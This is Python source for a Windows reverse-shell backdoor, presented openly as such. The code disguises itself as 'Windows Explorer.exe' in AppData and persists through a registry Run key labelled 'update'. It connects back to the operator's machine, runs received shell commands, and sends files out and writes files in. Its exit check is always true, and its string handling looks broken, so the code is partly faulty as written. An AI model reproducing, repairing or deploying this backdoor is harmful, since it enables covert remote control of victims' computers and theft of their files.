import socket, subprocess, json, os, base64, sys, shutil

class Backdoor:

    def __init__(self, ip, port):
        self.persist()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # (IP of my machine (not target), and chosen port for connection)
        self.connection.connect((ip, port)) 

    def persist(self):
        copy_to = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(copy_to):
            shutil.copyfile(sys.executable, copy_to)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + copy_to + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful\n"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit" or "quit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error generated during execution\n"
            
            self.reliable_send(command_result)
